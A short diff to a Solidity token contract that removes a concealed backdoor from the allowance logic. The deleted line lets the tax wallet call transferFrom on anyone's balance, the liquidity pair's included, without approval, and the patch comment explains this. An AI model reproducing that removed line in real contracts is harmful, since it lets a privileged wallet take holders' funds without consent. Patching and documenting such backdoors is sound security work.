@@ -1,0 +1,19 @@
+--- shipped/Token.sol
++++ variant/Token.sol
+@@ -255,8 +255,14 @@
+         address owner,
+         address spender,
+         uint256 amount
+-    ) private view returns (uint256) {
+-        return msg.sender != _taxWallet && (owner == _uniswapPair || spender != _deadWallet) ? amount : 0;
++    ) private pure returns (uint256) {
++        // PATCH: how much allowance a transferFrom consumes must never depend on WHO is
++        // calling. The original returned 0 whenever msg.sender was the tax wallet, so the
++        // tax wallet could move any holder's balance -- including the pair's -- with no
++        // approval at all. Every spender is now debited the full amount they moved.
++        owner;
++        spender;
++        return amount;
+     }
+ 
+     function transferFrom(
